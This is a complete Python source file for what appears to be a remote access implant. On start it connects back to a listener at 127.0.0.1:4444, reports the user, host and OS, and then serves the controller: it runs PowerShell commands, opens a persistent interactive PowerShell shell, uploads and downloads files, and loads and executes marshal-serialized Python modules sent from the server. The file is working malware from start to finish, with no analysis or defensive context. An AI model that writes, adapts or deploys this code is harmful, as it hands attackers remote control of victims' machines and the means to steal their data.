from multiprocessing import Process, Pipe, set_start_method, freeze_support
import types
import socket
import getpass
import marshal
import platform
import threading
import subprocess
import zipfile
import tempfile
import time
import sys
import io
import os

class Request:
    def __init__(self):
        self.conn = None
        self.header_separator = b":|::|:"
        self.header = b""
        self.data = b""

    def set_conn(self, conn):
        self.conn = conn

    def set_header_separator(self, seperator):
        self.header_separator = seperator if isinstance(seperator, bytes) else seperator.encode()

    def set_header(self, header):
        self.header = header if isinstance(header, bytes) else header.encode()

    def set_data(self, data):
        self.data = data if isinstance(data, bytes) else data.encode()

    def get_header_separator(self):
        return self.header_separator

    def get_header(self):
        return self.header

    def get_data(self, binary=False):
        return self.data if binary else self.data.decode(errors="ignore")

    def send(self):
        sep = self.header_separator
        header = self.header
        data = self.data
        
        payload = data
        if header:
            payload = header + sep + payload
        length = f"{len(payload):<10}".encode()
        self.conn.sendall(length + payload)
        
    def recv(self, binary=False):
        raw_length = self._recv_n_bytes(10)
        if not raw_length:
            return False

        try:
            length = int(raw_length.strip())
        except ValueError:
            print("Invalid length header.")
            return False

        body = self._recv_n_bytes(length)
        if not body:
            return False

        parts = body.split(self.header_separator, 1)

        header = b""
        
        if len(parts) == 2:
            header, data = parts
        elif len(parts) == 1:
            data = parts[0]
            
        self.header = header if binary else header.decode(errors="ignore")
        self.data = data if binary else data.decode(errors="ignore")
        return True

    def _recv_n_bytes(self, n):
        buffer = b""
        while len(buffer) < n:
            chunk = self.conn.recv(n - len(buffer))
            if not chunk:
                return None
            buffer += chunk
        return buffer
    
    def close(self):
        self.conn.close()
        
def send_data(conn, data, header=None, header_separator=None):
    try:
        req = Request()
        req.set_conn(conn)
        if header_separator:
            req.set_header_separator(header_separator)
        if header:
            req.set_header(header)
        req.set_data(data)
        req.send()
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        close(conn)
        
def recv_data(conn, binary=False):
    try:
        req = Request()
        req.set_conn(conn)
        req.recv(binary)
        return req.header, req.data
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        close(conn)
        
def close(conn):
    req = Request()
    req.set_conn(conn)
    req.close()

class PersistentShell:
    def __init__(self):
        self.process = subprocess.Popen(
            ["powershell.exe"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        self.output = ""
        self.lock = threading.Lock()
        self.marker = "__END__MARKER__"
        self.command_done = threading.Event()
        self._start_reader()
        self.closed = False

    def _start_reader(self):
        def read_output():
            buffer = ""
            for line in self.process.stdout:
                if line.startswith("PS "):
                    continue
                buffer += line
                if self.marker in line:
                    with self.lock:
                        self.output = buffer.replace(self.marker, "").strip()
                        buffer = ""
                    self.command_done.set()
        threading.Thread(target=read_output, daemon=True).start()

    def execute(self, cmd: str) -> str:
        if self.closed:
            return "Shell already closed"

        if cmd.strip().lower() == "exit":
            self.process.stdin.write("exit\n")
            self.process.stdin.flush()
            self.process.wait()
            self.closed = True
            return "Shell closed"

        with self.lock:
            self.output = ""
        self.command_done.clear()

        full_cmd = f"{cmd}; echo {self.marker}"
        try:
            self.process.stdin.write(full_cmd + "\n")
            self.process.stdin.flush()
        except Exception as e:
            return f"Failed to write command: {e}"

        self.command_done.wait()
        with self.lock:
            return self.output

def execute(cmd) -> str:
    try:
        result = subprocess.check_output(["powershell","-c",cmd],shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output
    return result.decode()

def shell(conn):
    shell = PersistentShell()
    
    while True:
        response = None
        _, cmd = recv_data(conn)
        
        response = "\n" + shell.execute(cmd) + "\n\n"
        if cmd == "exit":
            break
        
        if not response:
            response = "\n"
        send_data(conn, response)
        
    return response.strip("\n")

def get_system_info():
    username = getpass.getuser()        
    hostname = socket.gethostname()     
    os_type = platform.system().lower() 
    arch = platform.machine().lower()   

    if arch in ["amd64", "x86_64"]:
        arch = "x64"
    elif "arm" in arch:
        arch = "arm"
    sep = Request().get_header_separator().decode()
    return f"{sep}{username}{sep}{hostname}{sep}{os_type}-{arch}"

def unzip_library(zip_path, extract_to):
    os.makedirs(extract_to, exist_ok=True)
    with zipfile.ZipFile(io.BytesIO(zip_path), 'r') as zipf:
        zipf.extractall(extract_to)

    if os.path.isdir(zip_path):
        os.remove(zip_path)

def run_module(lib, module, temp_dir, conn):
        unzip_library(lib, f"{temp_dir}/lib")
        
        code_obj = marshal.loads(module)
        mod_name = 'badmod'
        mod = types.ModuleType(mod_name)
        
        sys.path.insert(0, f"{temp_dir}/lib")
        exec(code_obj, mod.__dict__)
        if hasattr(mod, 'main'):
            result = mod.main()
            conn.send(result)
            
        else:
            conn.send(("", f"No entry-point 'main' in module {mod_name}"))
        conn.close()
            
def execute_module(data):
    parts = data.split(b"::::")
    lib = parts[0]
    module = parts[1]

    with tempfile.TemporaryDirectory() as temp_dir:
        
        parent_conn, child_conn = Pipe()
        p = Process(target=run_module, args=(lib, module, temp_dir, child_conn))
        p.start()
        if parent_conn.poll(10):
            result = parent_conn.recv()
        else:
            result = ("", "Timeout waiting for module result")
        p.join(timeout=10)
        if p.is_alive():
            p.terminate()
            p.join()
            
        return result
    
def upload(data):
    parts = data.split(b"::::")
    name = parts[0].decode()
    data = parts[1]
    
    with open(name, "wb") as f:
        f.write(data)

    file_path = f"{os.getcwd()}\\{name}"
        
    return b"UPLOAD_FILE_OK", f"File saved at {file_path}".encode()

def download(data):
    parts = data.split(b"::::")
    file_path = parts[1]

    if not os.path.isfile(file_path.decode()):
        return b"DOWNLOAD_FILE_NOTFOUND", file_path
    
    with open(file_path.decode(), "rb") as f:
        data = f.read()
        
    return b"DOWNLOAD_FILE_OK", data

def main():
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect(("127.0.0.1", 4444))
    send_data(conn,get_system_info())
    while True:
        response = None
        header, cmd = recv_data(conn, True)
        
        if header:
            match header.decode():
                case "CMD":
                    response = execute(cmd.decode())
                case "SHELL":
                    response = shell(conn)
                case "MODULE":
                    header, response = execute_module(cmd)
                case "UPLOAD":
                    header, response = upload(cmd)
                case "DOWNLOAD":
                    header, response = download(cmd)
                case _:
                    pass

        if not response:
            response = "\n"
    
        send_data(conn, response, header)
            
        
if __name__ == "__main__":
    freeze_support()
    set_start_method("spawn")
    main()